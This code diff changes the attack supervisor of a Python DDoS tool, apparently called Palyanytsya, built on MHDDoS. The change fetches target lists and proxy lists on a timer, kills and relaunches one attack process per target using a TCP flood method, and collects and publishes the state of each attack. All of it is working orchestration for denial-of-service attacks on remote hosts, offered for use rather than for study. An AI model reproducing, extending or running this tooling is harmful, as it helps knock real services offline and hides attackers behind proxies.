@@ -1,12 +1,13 @@
 import time
 from dataclasses import dataclass
 from multiprocessing import Queue, Process
+from queue import Empty
 from threading import Thread
-from typing import List
+from typing import List, Dict
 
 import psutil
 
-from MHDDoS.start import attack
+from MHDDoS.start import attack, AttackState
 from MHDDoS.utils.config_files import read_configuration_file_lines
 from MHDDoS.utils.proxies import load_proxies
 from MHDDoS.utils.targets import Target
@@ -21,6 +22,8 @@ class AttackSupervisorState:
     is_fetching_proxies: bool
     attack_processes_count: int
 
+    attack_states: List[AttackState]
+
 
 class AttackSupervisor(Thread):
     """Thread which controls the state of the attack processes in Palyanytsya."""
@@ -29,33 +32,39 @@ class AttackSupervisor(Thread):
     _attacks_state_queue: Queue
     _supervisor_state_queue: Queue
 
-    _targets: List[Target]
-    _targets_fetch_interval: TimeInterval
-    _proxies_addresses: List[str]
-    _proxies_fetch_interval: TimeInterval
-    _attack_processes: List[Process]
+    _targets: List[Target] = []
+    _proxies_addresses: List[str] = []
+    _attack_processes: List[Process] = []
+    _attack_states: Dict[int, AttackState] = {}
 
-    _internal_loop_sleep_interval: float = 0.1
+    _targets_fetch_interval: TimeInterval
+    _proxies_fetch_interval: TimeInterval
+
+    _internal_loop_sleep_interval: float = 0.01
+    _state_publish_interval: float = 0.1
+
+    _is_fetching_proxies: bool = False
+    _is_fetching_targets: bool = False
 
     def __init__(self,
                  args: Arguments,
                  attacks_state_queue: Queue,
                  supervisor_state_queue: Queue):
-        Thread.__init__(self, daemon=True)
+        Thread.__init__(self, daemon=True, name="Supervisor")
 
         self._args = args
         self._attacks_state_queue = attacks_state_queue
         self._supervisor_state_queue = supervisor_state_queue
 
-        self._targets = []
         self._targets_fetch_interval = TimeInterval(args.config_fetch_interval)
-        self._proxies_addresses = []
         self._proxies_fetch_interval = TimeInterval(args.proxies_fetch_interval)
-        self._attack_processes = []
 
         logger.info("Starting attack supervisor...")
 
     def run(self) -> None:
+        state_publisher = Thread(target=self._state_publisher_thread, daemon=True)
+        state_publisher.start()
+
         while True:
             targets_changed = self._fetch_targets()
             proxies_changed = self._fetch_proxies()
@@ -63,36 +72,9 @@ class AttackSupervisor(Thread):
             if targets_changed or proxies_changed:
                 self._restart_attacks()
 
+            self._update_attack_states()
+
             time.sleep(self._internal_loop_sleep_interval)
-
-    def _restart_attacks(self) -> None:
-        # TODO: apply CPU usage limit to attack processes?
-        cpu_count = psutil.cpu_count()
-        targets_count = len(self._targets)
-        cpu_per_target = float(cpu_count) / targets_count
-
-        # kill all existing attack processes
-        for process in self._attack_processes:
-            process.kill()
-
-        # launch attack process for every target
-        for target in self._targets:
-            attack_method = "GET"  # TODO: support multiple attack methods!
-            attack_process = Process(
-                target=attack,
-                kwargs={
-                    "target": target,
-                    "attack_method": attack_method,
-                    "proxies_file_path": self._args.proxies,
-                    "attack_state_queue": self._attacks_state_queue,
-                },
-                daemon=True
-            )
-            self._attack_processes.append(attack_process)
-            attack_process.start()
-
-    def _collect_attack_states(self) -> None:
-        pass
 
     def _fetch_targets(self) -> bool:
         """
@@ -115,12 +97,13 @@ class AttackSupervisor(Thread):
 
         new_targets: List[Target] = []
         for target_string in new_targets_strings:
+            logger.info(f"parsing from '{target_string}'")
             target = Target.parse_from_string(target_string)
             if not target:
                 continue
             elif target.is_valid():
                 new_targets.append(target)
-                print(f"target: '{target}'")
+                logger.info(f"Fetched target: '{target}'")
             else:
                 logger.error(f"Target '{target}' is not valid. Will not attack this one.")
 
@@ -162,6 +145,72 @@ class AttackSupervisor(Thread):
         self._proxies_addresses = new_proxies_addresses
         logger.info(f"Proxies updated. Attack processes will be re-initialized for {len(new_proxies_addresses)} loaded proxies.")
         return True
+
+    def _restart_attacks(self) -> None:
+        # kill all existing attack processes
+        for process in self._attack_processes:
+            process.kill()
+
+        # check if we have targets
+        targets_count = len(self._targets)
+        if targets_count <= 0:
+            logger.error("Attacks will not be started, as there are no valid targets.")
+            return
+
+        # TODO: apply CPU usage limit to attack processes?
+        cpu_count = psutil.cpu_count()
+        cpu_per_target = float(cpu_count) / targets_count
+
+        # launch attack process for every target
+        for i, target in enumerate(self._targets):
+            attack_method = "TCP"  # TODO: support multiple attack methods!
+            attack_process = Process(
+                target=attack,
+                kwargs={
+                    "target": target,
+                    "attack_method": attack_method,
+                    "proxies_file_path": self._args.proxies,
+                    "attack_state_queue": self._attacks_state_queue,
+                },
+                daemon=True,
+                name=f"ATTACK_{i}"
+            )
+            self._attack_processes.append(attack_process)
+            attack_process.start()
+
+    def _update_attack_states(self) -> None:
+        if len(self._attack_processes) <= 0:
+            return
+
+        # collect all that's available in the attack state queue
+        new_states: Dict[int, AttackState] = {}
+        for _ in range(100):  # <- limit retries so that we don't run infinitely in that low-chance situation where our attack loops share state faster than the Supervisor updates
+            try:
+                new_state: AttackState = self._attacks_state_queue.get_nowait()
+                new_states[new_state.attack_pid] = new_state  # <- overwrite every new state for the same attack PID; this way we will have only the most recent states left in the Dict after this loop
+            except Empty:
+                break
+
+        previous_attack_states = self._attack_states.copy()
+        previous_attack_states.update(new_states)
+        self._attack_states = previous_attack_states
+
+    def _restart_dead_attacks(self):
+        # TODO: do this
+        raise NotImplemented
+
+    def _state_publisher_thread(self):
+        while True:
+            sorted_attack_states = [self._attack_states[k] for k in sorted(self._attack_states.keys())]
+            state = AttackSupervisorState(
+                is_fetching_proxies=self._is_fetching_proxies,
+                is_fetching_configuration=self._is_fetching_targets,
+                attack_processes_count=len(self._attack_processes),
+                attack_states=sorted_attack_states,
+            )
+            self._supervisor_state_queue.put(state)
+
+            time.sleep(self._state_publish_interval)
 
     @staticmethod
     def _compare_lists(list_a: List, list_b: List) -> bool:
